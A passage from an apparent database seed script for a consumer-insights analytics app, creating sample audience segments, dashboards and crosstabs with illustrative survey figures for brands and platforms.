        status: InvitationStatus.PENDING,
        expiresAt: new Date(now.getTime() + 3 * 24 * 60 * 60 * 1000)
      },
      {
        orgId: acmeCorp.id,
        email: 'expired@test.com',
        role: Role.MEMBER,
        token: crypto.randomBytes(32).toString('hex'),
        status: InvitationStatus.EXPIRED,
        expiresAt: oneWeekAgo
      },
      {
        orgId: enterpriseCo.id,
        email: 'analyst@enterprise.co',
        role: Role.MEMBER,
        token: crypto.randomBytes(32).toString('hex'),
        status: InvitationStatus.ACCEPTED,
        expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000)
      }
    ]
  })

  // ==================== SSO CONFIGURATION ====================
  console.log('🔐 Creating SSO configurations...')

  await prisma.sSOConfiguration.create({
    data: {
      orgId: enterpriseCo.id,
      provider: 'saml',
      metadataUrl: 'https://login.enterprise.co/saml/metadata',
      enabled: true
    }
  })

  // ==================== AUDIENCES ====================
  console.log('👥 Creating audiences...')

  // Create audiences with explicit IDs for reliable API access
  const _audience1 = await prisma.audience.create({
    data: {
      id: '1',
      orgId: acmeCorp.id,
      name: 'Gen Z Digital Natives',
      description: 'Young consumers aged 18-25 who are highly engaged with social media and digital platforms. Early adopters of new technology and trends.',
      criteria: {
        ageRange: { min: 18, max: 25 },
        behaviors: ['heavy_social_media_users', 'mobile_first', 'streaming_subscribers'],
        interests: ['gaming', 'short_form_video', 'sustainability', 'mental_health'],
        platforms: ['TikTok', 'Instagram', 'YouTube', 'Discord'],
        purchaseDrivers: ['brand_values', 'peer_recommendations', 'social_proof']
      },
      size: 42500000,
      markets: ['US', 'UK', 'AU', 'CA', 'DE'],
      isFavorite: true,
      usageCount: 156,
      lastUsed: new Date(now.getTime() - 2 * 60 * 60 * 1000),
      createdBy: adminUser.id
    }
  })

  const _audience2 = await prisma.audience.create({
    data: {
      id: '2',
      orgId: acmeCorp.id,
      name: 'Affluent Millennials',
      description: 'High-income millennials aged 28-40 with disposable income. Quality-conscious consumers who value experiences and premium products.',
      criteria: {
        ageRange: { min: 28, max: 40 },
        income: { min: 100000, currency: 'USD' },
        behaviors: ['premium_purchasers', 'experience_seekers', 'brand_loyal'],
        interests: ['travel', 'fine_dining', 'fitness', 'investment', 'real_estate'],
        lifestyle: ['urban_professional', 'health_conscious', 'career_focused']
      },
      size: 28300000,
      markets: ['US', 'UK', 'DE', 'FR', 'JP'],
      isFavorite: true,
      usageCount: 234,
      lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000),
      createdBy: johnDoe.id
    }
  })

  const _audience3 = await prisma.audience.create({
    data: {
      id: '3',
      orgId: acmeCorp.id,
      name: 'Eco-Conscious Consumers',
      description: 'Environmentally aware consumers who prioritize sustainability in purchasing decisions. Willing to pay premium for eco-friendly products.',
      criteria: {
        behaviors: ['sustainable_shoppers', 'ethical_consumers', 'recyclers'],
        interests: ['climate_change', 'renewable_energy', 'organic_products', 'zero_waste'],
        values: ['environmental_responsibility', 'social_impact', 'transparency'],
        purchaseDrivers: ['sustainability_certifications', 'carbon_footprint', 'ethical_sourcing']
      },
      size: 35800000,
      markets: ['US', 'UK', 'DE', 'NL', 'SE', 'DK', 'NO'],
      isFavorite: true,
      usageCount: 189,
      lastUsed: new Date(now.getTime() - 8 * 60 * 60 * 1000),
      createdBy: janeSmith.id
    }
  })

  const _audience4 = await prisma.audience.create({
    data: {
      id: '4',
      orgId: acmeCorp.id,
      name: 'Tech Early Adopters',
      description: 'Technology enthusiasts who are first to try new products and services. Influential in shaping tech trends and opinions.',
      criteria: {
        behaviors: ['early_adopters', 'tech_influencers', 'gadget_collectors'],
        interests: ['AI', 'VR_AR', 'smart_home', 'electric_vehicles', 'crypto'],
        platforms: ['Reddit', 'Twitter', 'ProductHunt', 'HackerNews'],
        purchaseDrivers: ['innovation', 'features', 'cutting_edge_tech']
      },
      size: 18500000,
      markets: ['US', 'UK', 'JP', 'KR', 'DE', 'CN'],
      isFavorite: false,
      usageCount: 145,
      lastUsed: new Date(now.getTime() - 24 * 60 * 60 * 1000),
      createdBy: adminUser.id
    }
  })

  const _audience5 = await prisma.audience.create({
    data: {
      id: '5',
      orgId: acmeCorp.id,
      name: 'Health & Wellness Enthusiasts',
      description: 'Consumers prioritizing physical and mental wellness. Regular exercisers, healthy eaters, and mindfulness practitioners.',
      criteria: {
        behaviors: ['regular_exercisers', 'healthy_eaters', 'supplement_users', 'meditation_practitioners'],
        interests: ['fitness', 'nutrition', 'mental_health', 'yoga', 'running'],
        purchaseDrivers: ['health_benefits', 'natural_ingredients', 'scientific_backing']
      },
      size: 52000000,
      markets: ['US', 'UK', 'AU', 'CA', 'DE', 'NL'],
      isFavorite: true,
      usageCount: 267,
      lastUsed: new Date(now.getTime() - 3 * 60 * 60 * 1000),
      createdBy: johnDoe.id
    }
  })

  const _audience6 = await prisma.audience.create({
    data: {
      id: '6',
      orgId: acmeCorp.id,
      name: 'Remote Workers',
      description: 'Professionals working from home or hybrid arrangements. High demand for productivity tools, home office equipment, and work-life balance solutions.',
      criteria: {
        employment: ['remote_full_time', 'hybrid', 'freelancer', 'digital_nomad'],
        behaviors: ['home_office_setup', 'video_conferencing', 'productivity_app_users'],
        interests: ['productivity', 'work_life_balance', 'home_improvement', 'coworking'],
        purchaseDrivers: ['functionality', 'comfort', 'productivity_gains']
      },
      size: 68000000,
      markets: ['US', 'UK', 'DE', 'NL', 'AU', 'CA', 'ES', 'PT'],
      isFavorite: false,
      usageCount: 98,
      lastUsed: new Date(now.getTime() - 48 * 60 * 60 * 1000),
      createdBy: janeSmith.id
    }
  })

  const _audience7 = await prisma.audience.create({
    data: {
      id: '7',
      orgId: acmeCorp.id,
      name: 'Luxury Seekers',
      description: 'High-net-worth individuals interested in luxury goods and premium experiences. Value exclusivity, craftsmanship, and status.',
      criteria: {
        income: { min: 200000, currency: 'USD' },
        behaviors: ['luxury_purchasers', 'exclusive_membership', 'premium_travel'],
        interests: ['luxury_fashion', 'fine_watches', 'premium_cars', 'private_travel'],
        purchaseDrivers: ['exclusivity', 'craftsmanship', 'heritage', 'status']
      },
      size: 8500000,
      markets: ['US', 'UK', 'FR', 'IT', 'CH', 'AE', 'SG', 'HK'],
      isFavorite: false,
      usageCount: 67,
      lastUsed: new Date(now.getTime() - 72 * 60 * 60 * 1000),
      createdBy: adminUser.id
    }
  })

  const _audience8 = await prisma.audience.create({
    data: {
      id: '8',
      orgId: acmeCorp.id,
      name: 'Parents with Young Children',
      description: 'Parents with children under 12. High focus on family-oriented products, education, and safety.',
      criteria: {
        familyStatus: 'parents_young_children',
        childrenAges: { min: 0, max: 12 },
        behaviors: ['family_oriented_shopping', 'safety_conscious', 'educational_content_consumers'],
        interests: ['parenting', 'education', 'family_activities', 'child_development'],
        purchaseDrivers: ['safety', 'educational_value', 'convenience', 'durability']
      },
      size: 45000000,
      markets: ['US', 'UK', 'AU', 'CA', 'DE', 'FR'],
      isFavorite: true,
      usageCount: 178,
      lastUsed: new Date(now.getTime() - 6 * 60 * 60 * 1000),
      createdBy: johnDoe.id
    }
  })

  const _audience9 = await prisma.audience.create({
    data: {
      id: '9',
      orgId: techStartup.id,
      name: 'SaaS Power Users',
      description: 'Heavy users of SaaS applications across productivity, collaboration, and development tools. High willingness to pay for premium features.',
      criteria: {
        behaviors: ['multi_saas_users', 'power_users', 'feature_maximizers'],
        interests: ['productivity', 'automation', 'integrations', 'team_collaboration'],
        tools: ['Slack', 'Notion', 'Figma', 'GitHub', 'Asana'],
        purchaseDrivers: ['efficiency', 'integrations', 'team_features']
      },
      size: 15000000,
      markets: ['US', 'UK', 'DE', 'CA', 'AU', 'NL'],
      isFavorite: true,
      usageCount: 89,
      lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000),
      createdBy: bobWilson.id
    }
  })

  const _audience10 = await prisma.audience.create({
    data: {
      id: '10',
      orgId: techStartup.id,
      name: 'Startup Founders',
      description: 'Founders and co-founders of startups. High interest in growth tools, funding, and scaling strategies.',
      criteria: {
        role: ['founder', 'co_founder', 'ceo_startup'],
        companyStage: ['pre_seed', 'seed', 'series_a', 'series_b'],
        behaviors: ['networking', 'fundraising', 'growth_hacking'],
        interests: ['venture_capital', 'scaling', 'hiring', 'product_market_fit'],
        purchaseDrivers: ['roi', 'scalability', 'founder_friendly']
      },
      size: 2500000,
      markets: ['US', 'UK', 'DE', 'IL', 'SG', 'IN'],
      isFavorite: true,
      usageCount: 56,
      lastUsed: new Date(now.getTime() - 18 * 60 * 60 * 1000),
      createdBy: bobWilson.id
    }
  })

  const _audience11 = await prisma.audience.create({
    data: {
      id: '11',
      orgId: enterpriseCo.id,
      name: 'Enterprise Decision Makers',
      description: 'C-level and senior executives at large enterprises. Key decision makers for B2B purchases and strategic initiatives.',
      criteria: {
        role: ['ceo', 'cfo', 'cto', 'cmo', 'vp', 'director'],
        companySize: { min: 1000 },
        behaviors: ['strategic_purchasers', 'vendor_evaluators', 'budget_holders'],
        interests: ['digital_transformation', 'enterprise_software', 'risk_management'],
        purchaseDrivers: ['reliability', 'security', 'support', 'compliance']
      },
      size: 5800000,
      markets: ['US', 'UK', 'DE', 'FR', 'JP', 'AU'],
      isFavorite: true,
      usageCount: 234,
      lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000),
      createdBy: sarahEnterprise.id
    }
  })

  // Get created audience IDs for use in crosstabs
  const allAudiences = await prisma.audience.findMany({ where: { orgId: { in: [acmeCorp.id, techStartup.id] } } })

  // ==================== DASHBOARDS ====================
  console.log('📊 Creating dashboards...')

  // Create dashboards with explicit IDs for reliable API access
  await prisma.dashboard.create({
    data: {
      id: '1',
      orgId: acmeCorp.id,
      name: 'Brand Performance Overview',
      description: 'Executive dashboard tracking key brand metrics across all tracked brands. Real-time health scores, market share trends, and competitive positioning.',
      layout: [
        { i: 'brand-health', x: 0, y: 0, w: 4, h: 2 },
        { i: 'market-share', x: 4, y: 0, w: 4, h: 2 },
        { i: 'nps-trend', x: 8, y: 0, w: 4, h: 2 },
        { i: 'awareness-funnel', x: 0, y: 2, w: 6, h: 3 },
        { i: 'competitor-radar', x: 6, y: 2, w: 6, h: 3 },
        { i: 'sentiment-timeline', x: 0, y: 5, w: 12, h: 2 }
      ],
      widgets: [
        { id: 'brand-health', type: 'gauge', title: 'Overall Brand Health', metric: 'brandHealth', threshold: { warning: 70, danger: 50 } },
        { id: 'market-share', type: 'pie', title: 'Market Share Distribution', metric: 'marketShare', showLegend: true },
        { id: 'nps-trend', type: 'line', title: 'NPS Trend (12 Months)', metric: 'nps', period: '12m', showTrendline: true },
        { id: 'awareness-funnel', type: 'funnel', title: 'Brand Funnel', stages: ['awareness', 'consideration', 'preference', 'loyalty'] },
        { id: 'competitor-radar', type: 'radar', title: 'Competitive Positioning', metrics: ['awareness', 'consideration', 'preference', 'loyalty', 'nps'] },
        { id: 'sentiment-timeline', type: 'area', title: 'Sentiment Over Time', metric: 'sentimentScore', showAnnotations: true }
      ],
      status: 'PUBLISHED',
      isPublic: false,
      views: 1247,
      createdBy: adminUser.id
    }
  })

  await prisma.dashboard.create({
    data: {
      id: '2',
      orgId: acmeCorp.id,
      name: 'Audience Insights Dashboard',
      description: 'Deep dive into audience segments. Demographics, behavioral patterns, and engagement metrics across key consumer groups.',
      layout: [
        { i: 'audience-sizes', x: 0, y: 0, w: 6, h: 2 },
        { i: 'age-distribution', x: 6, y: 0, w: 6, h: 2 },
        { i: 'engagement-heatmap', x: 0, y: 2, w: 8, h: 3 },
        { i: 'platform-breakdown', x: 8, y: 2, w: 4, h: 3 },
        { i: 'interest-treemap', x: 0, y: 5, w: 12, h: 3 }
      ],
      widgets: [
        { id: 'audience-sizes', type: 'bar', title: 'Audience Sizes', dataSource: 'audiences', metric: 'size', sortBy: 'desc' },
        { id: 'age-distribution', type: 'donut', title: 'Age Distribution', segments: ['18-24', '25-34', '35-44', '45-54', '55+'] },
        { id: 'engagement-heatmap', type: 'heatmap', title: 'Engagement by Audience & Platform', xAxis: 'platform', yAxis: 'audience' },
        { id: 'platform-breakdown', type: 'pie', title: 'Platform Preference', dataSource: 'platform_usage' },
        { id: 'interest-treemap', type: 'treemap', title: 'Interest Categories', dataSource: 'interests', colorScale: 'category' }
      ],
      status: 'PUBLISHED',
      isPublic: false,
      views: 892,
      createdBy: johnDoe.id
    }
  })

  await prisma.dashboard.create({
    data: {
      id: '3',
      orgId: acmeCorp.id,
      name: 'Competitive Analysis Hub',
      description: 'Monitor competitor brand performance. Side-by-side comparisons, trend analysis, and share of voice tracking.',
      layout: [
        { i: 'competitor-table', x: 0, y: 0, w: 12, h: 3 },
        { i: 'share-of-voice', x: 0, y: 3, w: 6, h: 2 },
        { i: 'sentiment-comparison', x: 6, y: 3, w: 6, h: 2 },
        { i: 'trend-lines', x: 0, y: 5, w: 12, h: 3 }
      ],
      widgets: [
        { id: 'competitor-table', type: 'table', title: 'Competitor Scorecard', columns: ['brand', 'awareness', 'consideration', 'preference', 'nps', 'sentiment'] },
        { id: 'share-of-voice', type: 'bar', title: 'Share of Voice', metric: 'sov', stacked: true },
        { id: 'sentiment-comparison', type: 'bar', title: 'Sentiment Comparison', metric: 'sentiment', showBenchmark: true },
        { id: 'trend-lines', type: 'line', title: 'Brand Health Trends (All Competitors)', multiSeries: true, period: '6m' }
      ],
      status: 'PUBLISHED',
      isPublic: false,
      views: 756,
      createdBy: janeSmith.id
    }
  })

  await prisma.dashboard.create({
    data: {
      id: '4',
      orgId: acmeCorp.id,
      name: 'Marketing Campaign Tracker',
      description: 'Track campaign impact on brand metrics. Pre/post analysis, attribution modeling, and ROI calculations.',
      layout: [
        { i: 'campaign-lift', x: 0, y: 0, w: 4, h: 2 },
        { id: 'roi-metric', x: 4, y: 0, w: 4, h: 2 },
        { i: 'reach-metric', x: 8, y: 0, w: 4, h: 2 },
        { i: 'lift-analysis', x: 0, y: 2, w: 6, h: 3 },
        { i: 'channel-performance', x: 6, y: 2, w: 6, h: 3 }
      ],
      widgets: [
        { id: 'campaign-lift', type: 'metric', title: 'Brand Lift', value: '+12.5%', trend: 'up', comparison: 'vs. pre-campaign' },
        { id: 'roi-metric', type: 'metric', title: 'Campaign ROI', value: '3.2x', trend: 'up', comparison: 'vs. target 2.5x' },
        { id: 'reach-metric', type: 'metric', title: 'Total Reach', value: '45.2M', trend: 'up', comparison: '+15% vs. plan' },
        { id: 'lift-analysis', type: 'bar', title: 'Metric Lift by Campaign', grouped: true, metrics: ['awareness', 'consideration', 'intent'] },
        { id: 'channel-performance', type: 'bar', title: 'Performance by Channel', channels: ['TV', 'Digital', 'Social', 'OOH', 'Radio'] }
      ],
      status: 'PUBLISHED',
      isPublic: false,
      views: 543,
      createdBy: adminUser.id
    }
  })

  await prisma.dashboard.create({
    data: {
      id: '5',
      orgId: acmeCorp.id,
      name: 'Consumer Trends Monitor',
      description: 'Track emerging consumer trends and behavioral shifts. Trend velocity, adoption curves, and predictive signals.',
      layout: [
        { i: 'trending-topics', x: 0, y: 0, w: 6, h: 3 },
        { i: 'adoption-curve', x: 6, y: 0, w: 6, h: 3 },
        { i: 'sentiment-stream', x: 0, y: 3, w: 12, h: 2 },
        { i: 'predictions', x: 0, y: 5, w: 12, h: 2 }
      ],
      widgets: [
        { id: 'trending-topics', type: 'wordcloud', title: 'Trending Topics', dataSource: 'social_listening', timeframe: '7d' },
        { id: 'adoption-curve', type: 'line', title: 'Trend Adoption Curves', multiSeries: true, showPhases: true },
        { id: 'sentiment-stream', type: 'stream', title: 'Real-time Sentiment', refreshRate: '5m' },
        { id: 'predictions', type: 'cards', title: 'Trend Predictions', showConfidence: true, count: 4 }
      ],
      status: 'DRAFT',
      isPublic: false,
      views: 234,
      createdBy: janeSmith.id
    }
  })

  await prisma.dashboard.create({
    data: {
      id: '6',
      orgId: techStartup.id,
      name: 'Startup Market Overview',
      description: 'Key metrics for startup market analysis. Market sizing, growth rates, and competitive landscape.',
      layout: [
        { i: 'market-size', x: 0, y: 0, w: 4, h: 2 },
        { i: 'growth-rate', x: 4, y: 0, w: 4, h: 2 },
        { i: 'competition-index', x: 8, y: 0, w: 4, h: 2 },
        { i: 'market-map', x: 0, y: 2, w: 12, h: 4 }
      ],
      widgets: [
        { id: 'market-size', type: 'metric', title: 'TAM', value: '$4.2B', trend: 'up', yoy: '+18%' },
        { id: 'growth-rate', type: 'metric', title: 'Market Growth', value: '23%', trend: 'up', comparison: 'CAGR' },
        { id: 'competition-index', type: 'gauge', title: 'Competition Intensity', value: 72, max: 100 },
        { id: 'market-map', type: 'scatter', title: 'Competitive Landscape', xAxis: 'market_share', yAxis: 'growth_rate', bubbleSize: 'revenue' }
      ],
      status: 'PUBLISHED',
      isPublic: false,
      views: 189,
      createdBy: bobWilson.id
    }
  })

  await prisma.dashboard.create({
    data: {
      id: '7',
      orgId: enterpriseCo.id,
      name: 'Enterprise Analytics Hub',
      description: 'Comprehensive enterprise analytics dashboard with drill-down capabilities and custom reporting.',
      layout: [
        { i: 'kpi-row', x: 0, y: 0, w: 12, h: 1 },
        { i: 'revenue-trend', x: 0, y: 1, w: 8, h: 3 },
        { i: 'segment-pie', x: 8, y: 1, w: 4, h: 3 },
        { i: 'regional-map', x: 0, y: 4, w: 6, h: 3 },
        { i: 'product-table', x: 6, y: 4, w: 6, h: 3 }
      ],
      widgets: [
        { id: 'kpi-row', type: 'kpi-strip', metrics: ['revenue', 'users', 'retention', 'nps'], comparison: 'yoy' },
        { id: 'revenue-trend', type: 'area', title: 'Revenue Trend', metric: 'revenue', period: '24m', showForecast: true },
        { id: 'segment-pie', type: 'pie', title: 'Revenue by Segment', dataSource: 'segments' },
        { id: 'regional-map', type: 'choropleth', title: 'Performance by Region', metric: 'revenue', colorScale: 'sequential' },
        { id: 'product-table', type: 'table', title: 'Product Performance', sortable: true, exportable: true }
      ],
      status: 'PUBLISHED',
      isPublic: false,
      views: 2341,
      createdBy: sarahEnterprise.id
    }
  })

  // ==================== CROSSTABS ====================
  console.log('📋 Creating crosstabs...')

  // Create 16 comprehensive crosstabs organized by category
  await prisma.crosstab.createMany({
    data: [
      // ============================================================================
      // SOCIAL & PLATFORM ANALYSIS (3 crosstabs)
      // ============================================================================
      {
        id: 'social-1',
        orgId: acmeCorp.id,
        name: 'Generational Social Media Platform Analysis',
        description: 'Comprehensive analysis of social media platform usage and engagement across generational cohorts',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 4).map(a => a.id),
        metrics: ['daily_usage', 'engagement_rate', 'content_creation', 'time_spent', 'purchase_influence', 'ad_receptivity', 'brand_discovery', 'trust_level'],
        filters: { platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter', 'LinkedIn'], period: 'last_quarter' },
        results: {
          rows: [
            { platform: 'TikTok', gen_z: 89.2, millennials: 58.5, gen_x: 22.3, boomers: 8.5 },
            { platform: 'Instagram', gen_z: 92.5, millennials: 82.3, gen_x: 48.5, boomers: 28.2 },
            { platform: 'YouTube', gen_z: 95.8, millennials: 88.5, gen_x: 72.3, boomers: 55.8 },
            { platform: 'Facebook', gen_z: 32.5, millennials: 68.2, gen_x: 78.5, boomers: 72.3 },
            { platform: 'Twitter/X', gen_z: 45.2, millennials: 52.8, gen_x: 42.5, boomers: 32.5 },
            { platform: 'LinkedIn', gen_z: 28.5, millennials: 72.3, gen_x: 68.5, boomers: 42.8 }
          ],
          metadata: { sampleSize: 85000, confidence: 0.95, lastUpdated: now.toISOString(), metric: 'percentage_active_users' }
        },
        views: 1245,
        createdBy: adminUser.id
      },
      {
        id: 'social-2',
        orgId: acmeCorp.id,
        name: 'TikTok vs Instagram Engagement by Age',
        description: 'Head-to-head comparison of TikTok and Instagram engagement metrics across age demographics',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 5).map(a => a.id),
        metrics: ['engagement_rate', 'avg_session_time', 'content_interactions', 'share_rate', 'save_rate', 'comment_rate'],
        filters: { platforms: ['TikTok', 'Instagram'], contentTypes: ['video', 'stories', 'reels'] },
        results: {
          rows: [
            { metric: 'Engagement Rate', tiktok_18_24: 8.5, instagram_18_24: 3.2, tiktok_25_34: 6.2, instagram_25_34: 2.8, tiktok_35_plus: 4.5, instagram_35_plus: 2.2 },
            { metric: 'Avg Session (min)', tiktok_18_24: 52.3, instagram_18_24: 28.5, tiktok_25_34: 38.5, instagram_25_34: 25.2, tiktok_35_plus: 22.5, instagram_35_plus: 18.8 },
            { metric: 'Daily Opens', tiktok_18_24: 12.5, instagram_18_24: 8.2, tiktok_25_34: 8.5, instagram_25_34: 7.5, tiktok_35_plus: 5.2, instagram_35_plus: 6.2 },
            { metric: 'Share Rate (%)', tiktok_18_24: 15.2, instagram_18_24: 8.5, tiktok_25_34: 12.3, instagram_25_34: 7.2, tiktok_35_plus: 8.5, instagram_35_plus: 5.8 }
          ],
          metadata: { sampleSize: 42000, confidence: 0.95, lastUpdated: now.toISOString() }
        },
        views: 892,
        createdBy: johnDoe.id
      },
      {
        id: 'social-3',
        orgId: acmeCorp.id,
        name: 'Content Format Preferences by Generation',
        description: 'Analysis of preferred content formats (video, images, text, audio) across generational segments',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 4).map(a => a.id),
        metrics: ['preference_score', 'engagement_rate', 'completion_rate', 'share_likelihood', 'brand_recall', 'purchase_intent', 'time_spent'],
        filters: { formats: ['short_video', 'long_video', 'images', 'carousels', 'stories', 'live_streams', 'podcasts'] },
        results: {
          rows: [
            { format: 'Short Video (<60s)', gen_z: 92.5, millennials: 78.5, gen_x: 52.3, boomers: 35.2 },
            { format: 'Long Video (>3min)', gen_z: 68.5, millennials: 72.3, gen_x: 65.8, boomers: 58.5 },
            { format: 'Image Carousels', gen_z: 75.2, millennials: 82.5, gen_x: 68.2, boomers: 55.8 },
            { format: 'Stories/Ephemeral', gen_z: 88.5, millennials: 72.5, gen_x: 42.3, boomers: 22.5 },
            { format: 'Live Streams', gen_z: 58.2, millennials: 52.5, gen_x: 38.5, boomers: 28.2 },
            { format: 'Podcasts/Audio', gen_z: 52.3, millennials: 68.5, gen_x: 58.2, boomers: 42.5 }
          ],
          metadata: { sampleSize: 35000, confidence: 0.95, metric: 'preference_percentage' }
        },
        views: 567,
        createdBy: janeSmith.id
      },

      // ============================================================================
      // COMMERCE & PURCHASE BEHAVIOR (3 crosstabs)
      // ============================================================================
      {
        id: 'commerce-1',
        orgId: acmeCorp.id,
        name: 'Income Segment Purchase Channel Preferences',
        description: 'Purchase channel preferences and behaviors across different income segments',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 5).map(a => a.id),
        metrics: ['channel_preference', 'avg_order_value', 'purchase_frequency', 'return_rate', 'loyalty_score', 'cross_channel_usage', 'mobile_share', 'social_commerce'],
        filters: { channels: ['online_direct', 'marketplace', 'retail_store', 'social_commerce', 'mobile_app'], income_bands: ['<50K', '50-100K', '100-150K', '150K+'] },
        results: {
          rows: [
            { channel: 'Brand Website', under_50k: 28.5, income_50_100k: 42.3, income_100_150k: 55.8, over_150k: 68.2 },
            { channel: 'Amazon/Marketplace', under_50k: 72.5, income_50_100k: 65.2, income_100_150k: 52.3, over_150k: 42.5 },
            { channel: 'Physical Retail', under_50k: 58.2, income_50_100k: 52.5, income_100_150k: 62.3, over_150k: 72.5 },
            { channel: 'Social Commerce', under_50k: 42.5, income_50_100k: 38.2, income_100_150k: 28.5, over_150k: 22.3 },
            { channel: 'Mobile App', under_50k: 52.3, income_50_100k: 58.5, income_100_150k: 62.5, over_150k: 55.8 }
          ],
          metadata: { sampleSize: 62000, confidence: 0.95, metric: 'percentage_primary_channel' }
        },
        views: 1056,
        createdBy: adminUser.id
      },
      {
        id: 'commerce-2',
        orgId: acmeCorp.id,
        name: 'E-commerce vs In-Store by Product Category',
        description: 'Channel preference analysis for different product categories',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 6).map(a => a.id),
        metrics: ['online_share', 'store_share', 'omnichannel_rate', 'return_rate', 'avg_basket_size'],
        filters: { categories: ['electronics', 'apparel', 'grocery', 'beauty', 'home', 'sports'] },
        results: {
          rows: [
            { category: 'Electronics', online: 72.5, in_store: 18.5, omnichannel: 9.0 },
            { category: 'Apparel', online: 48.2, in_store: 38.5, omnichannel: 13.3 },
            { category: 'Grocery', online: 22.5, in_store: 68.2, omnichannel: 9.3 },
            { category: 'Beauty', online: 55.8, in_store: 32.5, omnichannel: 11.7 },
            { category: 'Home & Garden', online: 42.3, in_store: 45.2, omnichannel: 12.5 },
            { category: 'Sports & Fitness', online: 52.5, in_store: 35.8, omnichannel: 11.7 }
          ],
          metadata: { sampleSize: 78000, confidence: 0.95, lastUpdated: now.toISOString() }
        },
        views: 789,
        createdBy: johnDoe.id
      },
      {
        id: 'commerce-3',
        orgId: acmeCorp.id,
        name: 'Subscription Service Adoption by Segment',
        description: 'Subscription service usage and preferences across consumer segments',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 5).map(a => a.id),
        metrics: ['adoption_rate', 'avg_subscriptions', 'monthly_spend', 'churn_rate', 'satisfaction', 'likelihood_to_add'],
        filters: { categories: ['streaming', 'meal_kits', 'beauty_boxes', 'fitness', 'software', 'news_media'] },
        results: {
          rows: [
            { category: 'Video Streaming', gen_z: 92.5, millennials: 88.2, gen_x: 75.5, boomers: 58.2 },
            { category: 'Music Streaming', gen_z: 85.2, millennials: 78.5, gen_x: 52.3, boomers: 32.5 },
            { category: 'Meal Kits', gen_z: 18.5, millennials: 35.2, gen_x: 28.5, boomers: 15.8 },
            { category: 'Fitness Apps', gen_z: 42.5, millennials: 38.2, gen_x: 25.5, boomers: 12.3 },
            { category: 'News/Media', gen_z: 15.2, millennials: 28.5, gen_x: 42.3, boomers: 55.8 }
          ],
          metadata: { sampleSize: 45000, confidence: 0.95, metric: 'active_subscription_rate' }
        },
        views: 654,
        createdBy: janeSmith.id
      },

      // ============================================================================
      // BRAND & COMPETITIVE INTELLIGENCE (3 crosstabs)
      // ============================================================================
      {
        id: 'brand-1',
        orgId: acmeCorp.id,
        name: 'Brand Awareness Competitive Landscape',
        description: 'Competitive brand awareness and consideration metrics across audience segments',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 6).map(a => a.id),
        metrics: ['unaided_awareness', 'aided_awareness', 'consideration', 'preference', 'usage', 'loyalty', 'nps', 'share_of_voice'],
        filters: { industry: 'sportswear', brands: ['Nike', 'Adidas', 'Puma', 'Under Armour', 'New Balance', 'Lululemon'] },
        results: {
          rows: [
            { brand: 'Nike', unaided: 78.5, aided: 95.2, consideration: 68.5, preference: 42.3, nps: 58 },
            { brand: 'Adidas', unaided: 62.3, aided: 92.5, consideration: 58.2, preference: 28.5, nps: 45 },
            { brand: 'Puma', unaided: 35.2, aided: 85.5, consideration: 42.5, preference: 15.8, nps: 38 },
            { brand: 'Under Armour', unaided: 42.5, aided: 82.3, consideration: 45.2, preference: 18.5, nps: 32 },
            { brand: 'New Balance', unaided: 38.5, aided: 78.5, consideration: 48.2, preference: 22.3, nps: 52 },
            { brand: 'Lululemon', unaided: 28.5, aided: 72.5, consideration: 38.5, preference: 25.8, nps: 62 }
          ],
          metadata: { sampleSize: 52000, confidence: 0.95, industry: 'sportswear' }
        },
        views: 1423,
        createdBy: adminUser.id
      },
      {
        id: 'brand-2',
        orgId: acmeCorp.id,
        name: 'Brand Health Funnel by Market',
        description: 'Brand funnel metrics (awareness to purchase) across key geographic markets',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 5).map(a => a.id),
        metrics: ['awareness', 'familiarity', 'consideration', 'preference', 'purchase'],
        filters: { markets: ['US', 'UK', 'Germany', 'France', 'Japan'], brand: 'Nike' },
        results: {
          rows: [
            { market: 'United States', awareness: 96.5, familiarity: 88.2, consideration: 72.5, preference: 45.2, purchase: 38.5 },
            { market: 'United Kingdom', awareness: 94.2, familiarity: 85.5, consideration: 68.2, preference: 42.3, purchase: 35.2 },
            { market: 'Germany', awareness: 92.5, familiarity: 82.3, consideration: 62.5, preference: 38.5, purchase: 32.5 },
            { market: 'France', awareness: 90.8, familiarity: 78.5, consideration: 58.2, preference: 35.8, purchase: 28.5 },
            { market: 'Japan', awareness: 95.2, familiarity: 88.5, consideration: 75.2, preference: 48.5, purchase: 42.3 }
          ],
          metadata: { sampleSize: 85000, confidence: 0.95, brand: 'Nike' }
        },
        views: 876,
        createdBy: johnDoe.id
      },
      {
        id: 'brand-3',
        orgId: acmeCorp.id,
        name: 'Competitive NPS Benchmarking',
        description: 'Net Promoter Score comparison across competitors with promoter/detractor breakdown',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 4).map(a => a.id),
        metrics: ['nps', 'promoters', 'passives', 'detractors'],
        filters: { industry: 'sportswear', period: 'last_quarter' },
        results: {
          rows: [
            { brand: 'Nike', nps: 58, promoters: 68, passives: 22, detractors: 10 },
            { brand: 'Lululemon', nps: 62, promoters: 72, passives: 18, detractors: 10 },
            { brand: 'New Balance', nps: 52, promoters: 62, passives: 28, detractors: 10 },
            { brand: 'Adidas', nps: 45, promoters: 58, passives: 29, detractors: 13 },
            { brand: 'Under Armour', nps: 32, promoters: 48, passives: 36, detractors: 16 }
          ],
          metadata: { sampleSize: 42000, confidence: 0.95, period: 'Q4 2024' }
        },
        views: 567,
        createdBy: janeSmith.id
      },

      // ============================================================================
      // MEDIA & CONTENT CONSUMPTION (3 crosstabs)
      // ============================================================================
      {
        id: 'media-1',
        orgId: acmeCorp.id,
        name: 'Media Consumption by Daypart',
        description: 'Media consumption patterns across different times of day by audience segment',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 5).map(a => a.id),
